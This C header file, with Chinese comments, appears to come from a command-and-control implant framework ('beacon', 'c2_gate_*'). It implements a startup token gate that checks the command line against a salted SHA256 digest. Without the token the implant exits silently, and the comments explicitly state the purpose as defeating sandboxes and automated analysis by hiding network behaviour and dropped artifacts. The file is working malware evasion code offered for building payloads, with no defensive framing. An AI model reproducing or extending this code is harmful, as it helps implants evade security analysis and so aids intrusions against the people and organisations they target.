/* csdev :: token_gate.h  --  启动口令门控 (Windows / Linux 共用, 纯 ASCII)
 *
 * 用途（抗沙箱/抗自动分析）:
 *   生成载荷时给一个口令, 注入"随机盐 + SHA256(盐||口令)"。
 *   植入体启动第一件事是校验**命令行参数**(与环境变量)里有没有这个口令:
 *     有   -> 正常上线
 *     没有 -> 安静退出, 自动化沙箱看到的只是一个"跑了一下就结束"的普通程序,
 *             拿不到任何网络行为与落地特征。
 *   不给口令生成时, 摘要为空, 这段在运行期直接跳过, 行为与原来一致(直接运行)。
 *
 * 为什么不是明文口令: 二进制里只存 64 字符的 hex 摘要 + 16 字符随机盐。
 * 盐每次生成随机, 所以同一个口令在不同构建里的摘要不同, 预计算的彩虹表无效。
 *
 * 盐与摘要的**来源由宿主提供** (两个平台的植入体各自实现):
 *   优先取运行时配置槽里的值, 槽位没写就退回编译期 -D 注入的值。
 * 这样做是为了让同一个模板既能生成带门控、也能生成不带门控的载荷 ——
 * 门控从"编译期开关"变成了"运行期数据", 不必为两种情形各准备一份模板。
 *
 * 生成方: 服务端生成器写入配置槽的 token_salt / token_hash 字段。
 */
#ifndef CSDEV_TOKEN_GATE_H
#define CSDEV_TOKEN_GATE_H

#include <string.h>

/* 需要调用方先 include crypto.h —— Windows 侧是 kits/beacon 的 "../crypto/crypto.h",
 * Linux 侧是 linux/ 的 "../kits/crypto/crypto.h", 两层目录层级不同, 这里不写死路径。 */
#ifndef SHA256_DIGEST
#error "token_gate.h 需要先 include crypto.h (提供 sha256() 与 SHA256_DIGEST)"
#endif

/* 宿主实现: 返回当前生效的盐 / 摘要。空字符串 = 未启用门控。 */
extern const char *c2_gate_salt(void);
extern const char *c2_gate_hash(void);

/* 门控是否启用 —— 以摘要非空为准。 */
static int cs_gate_active(void)
{
    const char *h = c2_gate_hash();
    return (h != 0 && h[0] != '\0');
}

/* 摘要比对: 32 字节 digest 是否等于 64 字符小写 hex 串 */
static int cs_hex_eq(const unsigned char *digest, const char *hex)
{
    static const char *H = "0123456789abcdef";
    int i;
    if (!hex) return 0;
    for (i = 0; i < 32; i++) {
        char hi = hex[i * 2], lo = hex[i * 2 + 1];
        if (hi == '\0' || lo == '\0') return 0;
        if (hi >= 'A' && hi <= 'F') hi = (char)(hi - 'A' + 'a');
        if (lo >= 'A' && lo <= 'F') lo = (char)(lo - 'A' + 'a');
        if (hi != H[digest[i] >> 4]) return 0;
        if (lo != H[digest[i] & 0x0F]) return 0;
    }
    return hex[64] == '\0'; /* 长度必须正好, 否则只是前缀相同 */
}

/* 候选口令是否匹配: 计算 SHA256(salt || candidate) 与摘要比对。
 * salt 用的是它的 hex 文本(与生成器一致), 这样两侧都只处理可打印字符。 */
static int cs_token_match(const char *cand)
{
    unsigned char d[SHA256_DIGEST];
    char buf[256];
    unsigned int n;
    const char *salt = c2_gate_salt();
    const char *hash = c2_gate_hash();

    if (!cand || cand[0] == '\0') return 0;
    if (!salt) salt = "";
    if (!hash || hash[0] == '\0') return 0;

    n = (unsigned int)strlen(salt);
    if (n > 200u) n = 200u; /* 生成器固定给 16, 这里只是防御 */
    memcpy(buf, salt, n);
    strncpy(buf + n, cand, sizeof(buf) - 1u - n);
    buf[sizeof(buf) - 1u] = '\0';

    sha256((const unsigned char *)buf, (unsigned int)strlen(buf), d);
    return cs_hex_eq(d, hash);
}

/* 在"参数串"里找口令: 按空白切分, 逐个候选试。
 * 传进来的是整条命令行(Windows)或 argv 拼串(Linux), 不解析引号 ——
 * 口令本身不该含空格, 保持简单可审计。 */
static int cs_token_scan(const char *cmdline)
{
    const char *p = cmdline;
    char tok[128];

    if (!p) return 0;
    while (*p) {
        unsigned int n = 0;
        while (*p == ' ' || *p == '\t') p++;
        if (!*p) break;
        /* 支持 --token=xxx 与裸值两种写法 */
        {
            const char *eq = 0;
            const char *q = p;
            while (*q && *q != ' ' && *q != '\t') q++;
            if ((q - p) > 8 && p[0] == '-' && p[1] == '-') {
                const char *r = p;
                while (r < q && *r != '=') r++;
                if (r < q) eq = r + 1;
            }
            if (eq) {
                while (eq < q && n < sizeof(tok) - 1u) tok[n++] = *eq++;
                tok[n] = '\0';
                if (cs_token_match(tok)) return 1;
            } else {
                const char *r = p;
                /* 跳过可执行文件路径与开关(以 - 开头的), 它们不可能是口令 */
                if (*r != '-' && !(r[0] != '\0' && (r[1] == ':' || r[1] == '\\'))) {
                    while (r < q && n < sizeof(tok) - 1u) tok[n++] = *r++;
                    tok[n] = '\0';
                    if (cs_token_match(tok)) return 1;
                }
            }
            p = q;
        }
    }
    return 0;
}

#endif /* CSDEV_TOKEN_GATE_H */
